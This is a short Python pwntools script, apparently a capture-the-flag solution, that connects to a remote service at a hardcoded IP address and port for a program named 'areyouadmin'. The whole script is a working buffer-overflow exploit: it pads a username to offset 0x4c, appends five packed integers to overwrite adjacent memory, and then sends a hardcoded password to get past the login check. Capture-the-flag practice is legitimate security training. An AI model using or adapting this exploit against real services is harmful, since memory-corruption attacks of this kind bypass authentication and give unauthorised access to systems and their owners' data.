from pwn import *

io = remote('194.5.207.113', 7020)
#io = process('areyouadmin')

print(io.recv())
payload = b'AlexTheUser\0'
payload += b'0'*(0x4c-len(payload))
payload += p32(233)
payload += p32(30)
payload += p32(187)
payload += p32(76)
payload += p32(123)
io.sendline(payload)
print(io.recv())
pause()
io.sendline(b'4l3x7h3p455w0rd\0')

print(io.recvall())
